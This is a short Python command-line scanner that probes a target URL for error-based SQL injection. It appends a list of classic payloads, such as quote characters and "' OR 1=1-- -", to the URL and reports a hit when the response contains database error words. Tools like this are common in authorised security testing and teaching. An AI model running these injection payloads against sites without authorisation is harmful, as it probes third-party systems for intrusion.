import sys
import requests

def test_sqli(url, payload):
    try:
        r = requests.get(url + payload, timeout=5)
        if "error" in r.text.lower() or "syntax" in r.text.lower() or "mysql" in r.text.lower():
            return True
    except:
        pass
    return False

def main():
    if len(sys.argv) < 2:
        print("[!] Usage: python sqli_scanner.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    # Simple error-based SQLi test
    payloads = ["'", "''", "`", "``", "\"", "\"\"", "' OR '1'='1", "' OR 1=1-- -"]

    print(f"[*] Testing for SQL Injection on: {target_url}")
    vulnerable = False
    for payload in payloads:
        if test_sqli(target_url, payload):
            print(f"[!] Potential SQLi found with payload: {payload}")
            vulnerable = True

    if not vulnerable:
        print("[-] No basic SQL injection vulnerabilities found.")

if __name__ == "__main__":
    main()
